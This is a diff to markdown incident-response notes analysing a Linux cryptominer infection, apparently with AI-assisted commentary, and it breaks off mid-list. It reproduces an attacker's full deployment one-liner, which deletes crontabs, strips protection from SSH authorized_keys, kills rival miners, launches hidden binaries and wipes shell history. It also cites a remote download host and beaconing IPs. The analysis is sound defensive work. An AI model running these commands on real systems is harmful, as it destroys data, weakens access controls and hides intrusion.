@@ -221,22 +221,17 @@ SOURCE: DarkTrace blog
 <img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />
 
 - `ygljglkjgfg0` appears
-   - First seen at /usr/bin/ygljglkjgfg0
    - Downloaded via curl and wget from a remote host (23.160.56.194/p.txt)
-   - Then copied to /etc/init.d/ygljglkjgfg0 and /etc/cron.hourly/gcc.sh
-- This is stage 1 payload deployment
-   - /usr/bin copy = persistent executable
-   - /etc/init.d = run at boot
-   - /etc/cron.hourly = run every hour or as scheduled
+   - First seen at /usr/bin/ygljglkjgfg0 = persistent executable
+   - Then copied to /etc/init.d/ygljglkjgfg0 = run at boot
+   - and /etc/cron.hourly/gcc.sh = run every hour or as scheduled
   
-- Stage 2 and replication
-   - tdrbhhtkky copied from ygljglkjgfg0
-   - omicykvmml copied from ygljglkjgfg0
-- These are clones or secondary payloads
+- Inumerable randomized file names copied from ygljglkjgfg0
+- These are clones or secondary payloads:
    - Backdoors
-   - Miner binaries (if that was the intent)
+   - Miner binaries
    - Remote control scripts
-- Randomized names (ygljglkjgfg0, ygljglkjgfg1, tdrbhhtkky, omicykvmml) = evade detection
+- Randomized file names (tdrbhhtkky, omicykvmml) evade detection
 
 - Crontab modification
 You see a bunch of tmp.* files in /var/spool/cron/crontabs/ (like tmp.RYF9JE and tmp.SHGiEW) along with root crontab activity.
@@ -412,3 +407,169 @@ Microsoft Defender for Endpoint successfully detected the malicious activity, en
 
 109.206.236.18
 Beaconing = the infected machine initiating an outbound connection to an attacker-controlled server.
+
+./network "rm -rf /var/tmp/Documents /tmp/cache ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ;  pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ;  cd /tmp/ ;  chmod +x cache ; ./cache >/dev/null 2>&1 & disown  ; history -c ; rm -rf .bash_history ~/.bash_history"
+
+🔥 What This Script Is Doing (High-Level)
+
+This command is:
+
+Cleaning up previous infections
+
+Killing competing malware/miners
+
+Setting up its working directory
+
+Moving payload files into a hidden location
+
+Making them executable
+
+Running them in the background
+
+Wiping evidence
+
+This is a very typical Linux cryptominer deployment flow.
+
+🧹 Step 1 — Cleanup & Reset
+rm -rf /var/tmp/Documents /tmp/cache
+mkdir /var/tmp/Documents
+
+
+Deletes old copies of itself and recreates its working folder.
+
+So /var/tmp/Documents is its “base of operations.”
+
+⛔ Step 2 — Remove Persistence + SSH Protections
+crontab -r
+
+
+Deletes all scheduled cron jobs.
+This removes other malware persistence — or even legit jobs.
+
+chattr -iae ~/.ssh/authorized_keys
+
+
+Removes file immutability flags.
+
+This is interesting:
+
+chattr can make files undeletable.
+
+They remove attributes so they can modify SSH keys.
+
+This suggests:
+✔ They may insert their own SSH key later
+✔ Or they’re ensuring nothing blocks them
+
+💀 Step 3 — Kill Competing Miners
+pkill Opera
+pkill cnrig
+pkill xmrig
+pkill java
+killall java
+killall xmrig
+killall cnrig
+
+
+This is classic cryptominer turf war behavior.
+
+xmrig → Monero miner
+
+cnrig → Variant miner
+
+java → Many botnets use Java-based loaders
+
+Opera → Some miners disguise themselves as browser processes
+
+They are eliminating competition to own 100% of CPU.
+
+This strongly confirms:
+
+This is a mining bot.
+
+📦 Step 4 — Move Payloads to Hidden Location
+mv /var/tmp/diicot /var/tmp/Documents/.diicot
+mv /var/tmp/kuak /var/tmp/Documents/kuak
+
+
+Key observations:
+
+.diicot → Hidden file (dot prefix)
+
+kuak → Likely secondary loader or helper binary
+
+This is deliberate naming — not random.
+
+You asked earlier if it was random.
+It is not. It’s reused consistently across runs.
+
+⚙ Step 5 — Make Executable
+chmod +x .*
+
+
+Makes hidden files executable.
+
+🚀 Step 6 — Launch Payload in Background
+/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
+
+
+Runs silently
+
+Redirects all output to null
+
+Backgrounds it
+
+Detaches from shell
+
+Stealth execution.
+
+Then:
+
+cd /tmp/
+chmod +x cache
+./cache >/dev/null 2>&1 & disown
+
+
+So there’s also a /tmp/cache binary running.
+
+This is likely:
+
+Main miner + watchdog
+
+Or miner + loader
+
+Two-process persistence pattern.
+
+🧽 Step 7 — Anti-Forensics
+history -c
+rm -rf .bash_history ~/.bash_history
+
+
+Clears command history.
+
+They do this twice — before and after launching processes.
+
+Very intentional.
+
+🧠 What’s Interesting Technically
+
+It removes cron jobs — but does not re-add one here.
+So persistence may happen inside .diicot.
+
+It manipulates authorized_keys attributes — suspicious.
+
+Uses /var/tmp not /tmp.
+/var/tmp survives reboots.
+
+Hidden filename .diicot
+That’s deliberate branding.
+
+The repetition in logs suggests:
+
+It keeps redeploying
+
+Or something keeps killing it and it relaunches
+
+🎯 Why It Keeps Repeating in Your Logs
+
+Likely one of:
